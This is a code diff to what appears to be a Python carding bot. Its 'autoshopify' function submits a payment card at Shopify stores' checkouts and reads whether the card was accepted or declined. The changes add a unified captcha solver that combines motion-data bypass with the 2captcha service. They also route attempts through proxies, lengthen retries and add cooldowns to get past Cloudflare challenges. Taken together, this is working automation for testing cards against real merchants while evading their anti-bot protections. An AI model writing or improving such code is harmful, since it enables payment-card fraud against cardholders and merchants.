@@ -16,17 +16,16 @@ from typing import Optional
 from BOT.Charge.Shopify.tls_session import TLSAsyncSession
 from BOT.Charge.Shopify.bulletproof_session import BulletproofSession
 
-# Import captcha solver
+# Import captcha solver (unified: motion bypass + 2captcha)
 try:
     from BOT.helper.shopify_captcha_solver import (
-        ShopifyCaptchaSolver,
+        solve_shopify_captcha,
         generate_bypass_data,
-        BrowserFingerprint,
-        MotionDataGenerator,
     )
     CAPTCHA_SOLVER_AVAILABLE = True
 except ImportError:
     CAPTCHA_SOLVER_AVAILABLE = False
+    solve_shopify_captcha = None
 
 try:
     import cloudscraper
@@ -2554,10 +2553,18 @@ async def autoshopify(url, card, session, proxy=None):
 
         # Captcha token: try bypass first; retry with solver on CAPTCHA_TOKEN_MISSING
         captcha_token = None
-        if CAPTCHA_SOLVER_AVAILABLE:
+        if CAPTCHA_SOLVER_AVAILABLE and solve_shopify_captcha:
             try:
-                bypass = generate_bypass_data(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "")
-                captcha_token = (bypass.get("token") or "").strip() if isinstance(bypass, dict) else None
+                result = await solve_shopify_captcha(
+                    checkout_url or f"{url.rstrip('/')}/checkout",
+                    x_checkout_one_session_token or "",
+                    "shopify",
+                    page_html=checkout_text,
+                    timeout=45,
+                    proxy=proxy,
+                )
+                if result and getattr(result, "success", False) and getattr(result, "token", None):
+                    captcha_token = result.token
             except Exception:
                 pass
 
@@ -2695,14 +2702,21 @@ async def autoshopify(url, card, session, proxy=None):
                         code = "CARD_DECLINED"
                         if errs and isinstance(errs[0], dict):
                             code = (errs[0].get("code") or errs[0].get("localizedMessage") or code)[:60]
-                        # Retry with captcha solver on CAPTCHA_TOKEN_MISSING / CAPTCHA (collagesoup, etc.)
-                        if ("CAPTCHA" in (code or "").upper() or "CAPTCHA_TOKEN" in (code or "")) and submit_attempt < 2 and CAPTCHA_SOLVER_AVAILABLE:
+                        # Retry with captcha solver on CAPTCHA_TOKEN_MISSING / CAPTCHA (collagesoup, stickerdad)
+                        if ("CAPTCHA" in (code or "").upper() or "CAPTCHA_TOKEN" in (code or "")) and submit_attempt < 3 and CAPTCHA_SOLVER_AVAILABLE and solve_shopify_captcha:
                             try:
-                                from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
-                                result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
-                                if result and getattr(result, "token", None):
+                                result = await solve_shopify_captcha(
+                                    checkout_url or f"{url.rstrip('/')}/checkout",
+                                    x_checkout_one_session_token or "",
+                                    "shopify",
+                                    page_html=checkout_text,
+                                    timeout=45,
+                                    proxy=proxy,
+                                )
+                                if result and getattr(result, "success", False) and getattr(result, "token", None):
                                     captcha_token = result.token
                                     submit_vars["input"]["captcha"]["token"] = captcha_token or ""
+                                    logger.info(f"Captcha solved via {getattr(result, 'method', '')}")
                                     await asyncio.sleep(0.5)
                                     continue
                             except Exception as e:
@@ -2861,10 +2875,9 @@ async def autoshopify(url, card, session, proxy=None):
                                 continue
                             except Exception:
                                 pass
-                        if "CAPTCHA_TOKEN_MISSING" in first_msg and submit_attempt == 0 and CAPTCHA_SOLVER_AVAILABLE:
+                        if "CAPTCHA_TOKEN_MISSING" in first_msg and submit_attempt == 0 and CAPTCHA_SOLVER_AVAILABLE and solve_shopify_captcha:
                             try:
-                                from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
-                                result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
+                                result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=25, proxy=proxy)
                                 if result and getattr(result, "token", None):
                                     captcha_token = result.token
                                     submit_vars["input"]["captcha"]["token"] = captcha_token or ""
@@ -2879,13 +2892,20 @@ async def autoshopify(url, card, session, proxy=None):
                     logger.debug(f"Submit parse error: {e}")
             if bill:
                 break
-            if submit_attempt == 0 and "CAPTCHA_TOKEN_MISSING" in (submit_text or "") and CAPTCHA_SOLVER_AVAILABLE:
+            if submit_attempt < 2 and "CAPTCHA_TOKEN_MISSING" in (submit_text or "") and CAPTCHA_SOLVER_AVAILABLE and solve_shopify_captcha:
                 try:
-                    from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
-                    result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
-                    if result and getattr(result, "token", None):
+                    result = await solve_shopify_captcha(
+                        checkout_url or f"{url.rstrip('/')}/checkout",
+                        x_checkout_one_session_token or "",
+                        "shopify",
+                        page_html=checkout_text,
+                        timeout=45,
+                        proxy=proxy,
+                    )
+                    if result and getattr(result, "success", False) and getattr(result, "token", None):
                         captcha_token = result.token
                         submit_vars["input"]["captcha"]["token"] = captcha_token or ""
+                        logger.info(f"Captcha solved via {getattr(result, 'method', '')}")
                         await asyncio.sleep(0.5)
                         continue
                 except Exception as e:
@@ -3136,7 +3156,7 @@ async def autoshopify_with_captcha_retry(
     max_captcha_retries: int = 5,
     proxy: Optional[str] = None,
 ) -> dict:
-    """Wrapper: call autoshopify with retries on captcha/errors."""
+    """Wrapper: call autoshopify with retries on captcha/errors. Longer cooldown on CAPTCHA."""
     last = {"Response": "UNKNOWN", "Status": False, "ReceiptId": None, "Price": None}
     for attempt in range(max(1, max_captcha_retries)):
         try:
@@ -3145,8 +3165,11 @@ async def autoshopify_with_captcha_retry(
                 last = res
                 if res.get("ReceiptId") or res.get("Status") is True:
                     return res
-                if res.get("Response") and ("captcha" in str(res.get("Response")).lower() or "hcaptcha" in str(res.get("Response")).lower()):
-                    await asyncio.sleep(1.0 + attempt * 0.5)
+                resp_str = str(res.get("Response") or "").lower()
+                if "captcha" in resp_str or "hcaptcha" in resp_str or "just a moment" in resp_str:
+                    cooldown = 2.0 + attempt * 1.5  # Longer cooldown: 2s, 3.5s, 5s...
+                    logger.debug(f"Captcha/CF retry {attempt + 1}/{max_captcha_retries}, cooldown {cooldown}s")
+                    await asyncio.sleep(cooldown)
                     continue
             return last
         except Exception as e:
